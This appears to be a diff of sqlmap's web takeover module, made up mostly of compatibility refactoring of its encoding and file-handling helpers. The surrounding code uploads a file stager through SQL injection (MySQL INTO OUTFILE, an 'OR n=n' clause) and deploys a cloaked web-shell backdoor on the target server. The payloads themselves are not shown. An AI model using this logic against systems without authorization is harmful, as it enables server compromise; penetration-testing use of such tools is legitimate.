@@ -25,6 +25,7 @@ from lib.core.common import ntToPosixSlashes
 from lib.core.common import isTechniqueAvailable
 from lib.core.common import isWindowsDriveLetterPath
 from lib.core.common import normalizePath
+from lib.core.common import openFile
 from lib.core.common import parseFilePaths
 from lib.core.common import posixToNtSlashes
 from lib.core.common import randomInt
@@ -32,8 +33,9 @@ from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.common import singleTimeWarnMessage
 from lib.core.compat import xrange
-from lib.core.convert import hexencode
-from lib.core.convert import utf8encode
+from lib.core.convert import encodeHex
+from lib.core.convert import getBytes
+from lib.core.convert import getText
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -94,11 +96,11 @@ class Web:
             if filepath.endswith('_'):
                 content = decloak(filepath)  # cloaked file
             else:
-                with open(filepath, "rb") as f:
+                with openFile(filepath, "rb", encoding=None) as f:
                     content = f.read()
 
         if content is not None:
-            stream = io.BytesIO(content)  # string content
+            stream = io.BytesIO(getBytes(content))  # string content
 
             # Reference: https://github.com/sqlmapproject/sqlmap/issues/3560
             # Reference: https://stackoverflow.com/a/4677542
@@ -129,7 +131,7 @@ class Web:
 
             page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
-            if "File uploaded" not in page:
+            if "File uploaded" not in (page or ""):
                 warnMsg = "unable to upload the file through the web file "
                 warnMsg += "stager to '%s'" % directory
                 logger.warn(warnMsg)
@@ -152,7 +154,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=encodeHex(uplQuery, binary=False))
         query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
         payload = agent.payload(newValue=query)
         page = Request.queryPage(payload)
@@ -274,9 +276,9 @@ class Web:
             directories = _
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webPlatform)
-        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webPlatform))
+        backdoorContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webPlatform)))
 
-        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
+        stagerContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform)))
 
         for directory in directories:
             if not directory:
@@ -330,9 +332,9 @@ class Web:
                     handle, filename = tempfile.mkstemp()
                     os.close(handle)
 
-                    with open(filename, "w+b") as f:
-                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
-                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
+                    with openFile(filename, "w+b") as f:
+                        _ = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform)))
+                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
                         f.write(_)
 
                     self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
